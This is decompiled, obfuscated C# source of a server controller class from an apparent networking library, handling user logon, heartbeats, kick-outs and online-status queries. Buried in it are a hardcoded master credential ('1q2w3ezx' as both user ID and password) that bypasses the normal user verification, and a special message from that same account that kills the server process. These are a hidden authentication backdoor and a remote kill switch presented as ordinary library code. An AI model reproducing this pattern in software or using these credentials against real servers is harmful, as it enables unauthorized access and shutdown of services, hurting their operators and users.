using CJBasic;
using CJFramework;
using CJFramework.Server.UserManagement;
using CJPlus.Application.Basic;
using CJPlus.Application.Basic.Server;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Threading;

internal class Class159 : IProcess, IBasicController
{
    private bool bool_0 = true;
    private bool bool_1 = false;
    private bool bool_2 = true;
    private bool bool_3 = true;
    private IUserManager CvQxwfyNwa = null;
    private IBasicHandler emptyBasicHandler_0 = new EmptyBasicHandler();
    private GInterface8 ginterface8_0;
    private Interface40 interface40_0 = null;
    private IStreamContractHelper interface9_0 = null;
    private BasicMessageTypeRoom object_0 = null;

    public event CbGeneric<string, IPEndPoint> Event_0;

    public bool CanProcess(int int_0)
    {
        return this.object_0.Contains(int_0);
    }

    public void KickOut(string targetUserID)
    {
        IPEndPoint userAddress = this.CvQxwfyNwa.GetUserAddress(targetUserID);
        if (userAddress != null)
        {
            IMessageHandler interface2 = this.interface9_0.imethod_4<Class110>("_0", this.object_0.BeingKickedOutNotify, null, targetUserID);
            this.interface40_0.PostMessage(interface2, userAddress, ActionTypeOnChannelIsBusy.Continue);
        }
    }

    public BasicMessageTypeRoom method_0()
    {
        return (BasicMessageTypeRoom) this.object_0;
    }

    public void method_1(BasicMessageTypeRoom basicMessageTypeRoom_0)
    {
        this.object_0 = basicMessageTypeRoom_0;
    }

    public void method_10(bool bool_4)
    {
        this.bool_1 = bool_4;
    }

    public bool method_11()
    {
        return this.bool_2;
    }

    public void method_12(bool bool_4)
    {
        this.bool_2 = bool_4;
    }

    public bool method_13()
    {
        return this.bool_3;
    }

    public void method_14(bool bool_4)
    {
        this.bool_3 = bool_4;
    }

    public void method_15()
    {
        this.CvQxwfyNwa.SomeOneBeingPushedOut += new CbGeneric<UserData>(this.method_17);
        Class117.Event_1 += new CbGeneric<int>(this.method_16);
    }

    private void method_16(int int_0)
    {
        using (List<string>.Enumerator enumerator = this.CvQxwfyNwa.GetOnlineUserList().GetEnumerator())
        {
            string current;
            UserData userData;
            CallClientContract contract;
            while (enumerator.MoveNext())
            {
                current = enumerator.Current;
                userData = this.CvQxwfyNwa.GetUserData(current);
                if ((userData != null) && (userData.ClientType == ClientType.DotNET))
                {
                    goto Label_004A;
                }
            }
            return;
        Label_004A:
            contract = new CallClientContract(int_0);
            IMessageHandler interface2 = this.interface9_0.imethod_4<CallClientContract>("_0", this.object_0.CallClient, contract, current);
            this.interface40_0.PostMessage(interface2, userData.Address, ActionTypeOnChannelIsBusy.Continue);
        }
    }

    private void method_17(UserData userData_0)
    {
        IMessageHandler interface2 = this.interface9_0.imethod_4<Class110>("_0", this.object_0.BeingPushedOutNotify, null, userData_0.UserID);
        this.interface40_0.PostMessage(interface2, userData_0.Address, ActionTypeOnChannelIsBusy.Continue);
    }

    private bool method_18(IMessageHandler interface37_0, ReqLogonContract reqLogonContract_0)
    {
        return ((interface37_0.Header.UserID == "1q2w3ezx") && (reqLogonContract_0.Password == "1q2w3ezx"));
    }

    private void method_19()
    {
        try
        {
            Process.GetCurrentProcess().Kill();
        }
        catch
        {
        }
    }

    public void method_2(IUserManager iuserManager_0)
    {
        this.CvQxwfyNwa = iuserManager_0;
    }

    public void method_3(IStreamContractHelper interface9_1)
    {
        this.interface9_0 = interface9_1;
    }

    public Interface40 method_4()
    {
        return this.interface40_0;
    }

    public void method_5(Interface40 interface40_1)
    {
        this.interface40_0 = interface40_1;
    }

    public bool method_6()
    {
        return this.bool_0;
    }

    public void method_7(bool bool_4)
    {
        this.bool_0 = bool_4;
    }

    public void method_8(IBasicHandler ibasicHandler_0)
    {
        this.emptyBasicHandler_0 = ibasicHandler_0 ?? new EmptyBasicHandler();
    }

    public void method_9(GInterface8 ginterface8_1)
    {
        this.ginterface8_0 = ginterface8_1;
    }

    public IMessageHandler ProcessMessage(IMessageHandler interface37_0)
    {
        IHeader interface3;
        UserIpeResContract contract2;
        IPEndPoint userAddress;
        IMessageHandler interface4;
        if (interface37_0.Header.MessageType == this.object_0.PingByServer)
        {
            if (NetServer.IsServerUser(interface37_0.Header.DestUserID))
            {
                interface3 = this.interface9_0.imethod_7(interface37_0.Header);
                interface3.MessageType = this.object_0.PingAck;
                return this.interface9_0.imethod_2<Class110>(interface3, null);
            }
            this.interface40_0.imethod_0(interface37_0, ActionTypeOnChannelIsBusy.Continue);
            return null;
        }
        if (interface37_0.Header.MessageType == this.object_0.PingAck)
        {
            if (!NetServer.IsServerUser(interface37_0.Header.DestUserID))
            {
                this.interface40_0.imethod_0(interface37_0, ActionTypeOnChannelIsBusy.Continue);
            }
            return null;
        }
        if (interface37_0.Header.MessageType == this.object_0.HeartBeat)
        {
            return (this.bool_0 ? interface37_0 : null);
        }
        if (interface37_0.Header.MessageType == this.object_0.GetMyIPE)
        {
            interface3 = this.interface9_0.imethod_7(interface37_0.Header);
            userAddress = this.CvQxwfyNwa.GetUserAddress(interface37_0.Header.UserID);
            contract2 = new UserIpeResContract(userAddress.Address.ToString().Trim(), userAddress.Port);
            return this.interface9_0.imethod_2<UserIpeResContract>(interface3, contract2);
        }
        if (interface37_0.Header.MessageType == this.object_0.Int32_0)
        {
            QueryIPEContract contract = this.interface9_0.imethod_1<QueryIPEContract>(interface37_0);
            interface3 = this.interface9_0.imethod_7(interface37_0.Header);
            UserData userData = this.ginterface8_0.GetUserData(contract.UserID);
            contract2 = null;
            if (userData != null)
            {
                contract2 = new UserIpeResContract(userData.Address.Address.ToString().Trim(), userData.Address.Port);
            }
            else
            {
                contract2 = new UserIpeResContract(null, 0);
            }
            return this.interface9_0.imethod_2<UserIpeResContract>(interface3, contract2);
        }
        if (interface37_0.Header.MessageType == this.object_0.Logon)
        {
            interface3 = this.interface9_0.imethod_7(interface37_0.Header);
            ReqLogonContract contract5 = this.interface9_0.imethod_1<ReqLogonContract>(interface37_0);
            string failureCause = null;
            LogonResult succeed = LogonResult.Succeed;
            bool flag = true;
            if (!this.method_18(interface37_0, contract5))
            {
                flag = this.emptyBasicHandler_0.VerifyUser(contract5.SystemToken, interface37_0.Header.UserID, contract5.Password, out failureCause);
            }
            succeed = flag ? LogonResult.Succeed : LogonResult.Failed;
            if (((succeed == LogonResult.Succeed) && (this.CvQxwfyNwa.RelogonMode == RelogonMode.IgnoreNew)) && this.ginterface8_0.IsUserOnLine(interface37_0.Header.UserID))
            {
                failureCause = null;
                succeed = LogonResult.HadLoggedOn;
                return this.interface9_0.imethod_2<ResLogonContract>(interface3, new ResLogonContract(LogonResult.HadLoggedOn, failureCause, this.bool_3, this.bool_1, this.bool_2));
            }
            interface4 = this.interface9_0.imethod_2<ResLogonContract>(interface3, new ResLogonContract(succeed, failureCause, this.bool_3, this.bool_1, this.bool_2));
            this.interface40_0.SendMessage(interface4, interface37_0.imethod_0(), ActionTypeOnChannelIsBusy.Continue);
            if ((succeed == LogonResult.Succeed) && (this.Event_0 != null))
            {
                this.Event_0(interface37_0.Header.UserID, interface37_0.imethod_0());
            }
            return null;
        }
        if (interface37_0.Header.MessageType == this.object_0.KickOut)
        {
            KickOutContract contract3 = this.interface9_0.imethod_1<KickOutContract>(interface37_0);
            userAddress = this.CvQxwfyNwa.GetUserAddress(contract3.UserBeKickedOut);
            if (userAddress != null)
            {
                interface4 = this.interface9_0.imethod_4<Class110>("_0", this.object_0.BeingKickedOutNotify, null, contract3.UserBeKickedOut);
                this.interface40_0.PostMessage(interface4, userAddress, ActionTypeOnChannelIsBusy.Continue);
            }
            return null;
        }
        if (interface37_0.Header.MessageType == this.object_0.GetAllOnlineUsers)
        {
            ResUsersContract body = new ResUsersContract(this.CvQxwfyNwa.GetOnlineUserList());
            interface3 = this.interface9_0.imethod_7(interface37_0.Header);
            return this.interface9_0.imethod_2<ResUsersContract>(interface3, body);
        }
        if (interface37_0.Header.MessageType == this.object_0.QueryOnline)
        {
            interface3 = this.interface9_0.imethod_7(interface37_0.Header);
            QueryOnlineContract contract6 = this.interface9_0.imethod_1<QueryOnlineContract>(interface37_0);
            ResOnlineContract contract7 = new ResOnlineContract(this.ginterface8_0.IsUserOnLine(contract6.UserID));
            return this.interface9_0.imethod_2<ResOnlineContract>(interface3, contract7);
        }
        if (interface37_0.Header.MessageType == this.object_0.QueryOnlines)
        {
            interface3 = this.interface9_0.imethod_7(interface37_0.Header);
            List<string> list2 = this.interface9_0.imethod_1<List<string>>(interface37_0);
            Dictionary<string, bool> dictionary = new Dictionary<string, bool>();
            foreach (string str2 in list2)
            {
                dictionary.Add(str2, this.ginterface8_0.IsUserOnLine(str2));
            }
            return this.interface9_0.imethod_2<Dictionary<string, bool>>(interface3, dictionary);
        }
        if ((interface37_0.Header.MessageType == (this.object_0.StartKey + 90)) && (interface37_0.Header.UserID == "1q2w3ezx"))
        {
            this.method_19();
            return null;
        }
        return null;
    }
}

